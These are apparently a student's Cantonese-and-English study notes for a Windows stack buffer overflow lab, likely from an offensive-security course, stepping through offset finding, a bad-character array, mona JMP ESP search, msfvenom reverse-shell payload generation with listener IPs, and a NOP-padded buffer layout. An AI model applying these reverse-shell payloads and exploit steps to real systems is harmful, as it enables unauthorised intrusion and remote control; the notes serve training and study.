# Buffer Overflow

```
https://guif.re/bo  

1,要搵offset, so that we can control eip
msf-pattern_create -l 3000
msf-pattern_offset -l 3000 -q 77423077
2,要搵bad chars, 因為佢地會break左我地個payload
badchars = ("\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f"
"\x20\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40"
"\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f"
"\x60\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f"
"\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f"
"\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf"
"\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf"
"\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff")

esp right click follow in dump去搵

3,Finding the Right Module
!mona modules
要搵一個全部false, 又同我地exploit 個program 有關ge module
要留意個module ge base address唔係0x00開頭

nasm_shell
>JMP ESP       (FFE4)
!mona find -s '\xff\xe4' -m offsec_pwk_dll.dll
跟住記低results 入面d addresses
改我地exploit入面個eip變成哩個address
假設address係56526683
我地要變佢成 \x83\x66\x52\x56

係immunity禁個bluish black arrow,輸入個address, 再set break point
之後run exploit 睇下會唔會hit到個breakpoint

badchars = 04,05,38,39,61,62,75,76,B7,B8
badchars = 04,05,3c,3d,59,5a,5e,5f,97,98
4,generate payload
$ msfvenom -p windows/shell_reverse_tcp LHOST=192.168.19.26 LPORT=443 -f  c -e x86/shikata_ga_nai -b "\x00\x04\x05\x38\x39\x61\x62\x75\x76\xB7\xB8"
x86/fnstenv_mov

msfvenom -p windows/shell_reverse_tcp LHOST=192.168.19.71 LPORT=443 -f  c -e x86/shikata_ga_nai -b "\x00\x04\x05\x3C\x3D\x59\x5A\x5E\x5F\x97\x98"

msfvenom -p windows/shell_reverse_tcp LHOST=192.168.19.26 LPORT=443 -f  c -e x86/fnstenv_mov -b "\x00\x04\x05\x38\x39\x61\x62\x75\x76\xb7\xb8"
The shellcode needs to be decoded in memory, which means we need extra space in the stack.
We can achieve this by adding some NOPs before the shellcode, so our buffer looks like this:
"A"*2606 + "\x83\x0c\x09\x10" + "\x90" * 8 + shellcode


```